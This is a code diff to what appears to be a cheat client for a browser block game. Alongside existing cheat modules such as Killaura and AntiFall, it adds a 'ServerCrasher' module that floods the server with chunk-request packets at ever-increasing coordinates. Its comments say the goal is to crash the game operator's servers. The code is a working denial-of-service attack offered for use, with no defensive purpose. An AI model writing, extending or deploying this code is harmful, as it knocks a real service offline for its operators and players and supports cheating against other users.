@@ -1037,6 +1037,33 @@ h.addVelocity(-Math.sin(this.yaw) * g * .5, .1, -Math.cos(this.yaw) * g * .5);
 				else delete tickLoop["AntiFall"];
 			});
 
+			// this is a very old crash method,
+			// bread (one of the devs behind atmosphere) found it
+			// and later shared it to me when we were talking
+			// about the upcoming bloxd layer.
+
+			let serverCrasherStartX, serverCrasherStartZ;
+			let serverCrasherPacketsPerTick;
+			// if I recall, each chunk is 16 blocks or something.
+			// maybe we can get vector's servers to die by sending funny values or something idk.
+			const SERVER_CRASHER_CHUNK_XZ_INCREMENT = 16;
+			const serverCrasher = new Module("ServerCrasher", cb => {
+				if (cb) {
+					let x = serverCrasherStartX[1];
+					let z = serverCrasherStartZ[1];
+					tickLoop["ServerCrasher"] = function() {
+						for (let _ = 0; _ < serverCrasherPacketsPerTick[1]; _++) {
+							x += SERVER_CRASHER_CHUNK_XZ_INCREMENT;
+							z += SERVER_CRASHER_CHUNK_XZ_INCREMENT;
+							ClientSocket.sendPacket(new SPacketRequestChunk({
+								x,
+								z
+							}));
+						}
+					}
+				}
+			}/*, () => "Spam Chunk Load"*/);
+
 			// Killaura
 			let attackDelay = Date.now();
 			let didSwing = false;
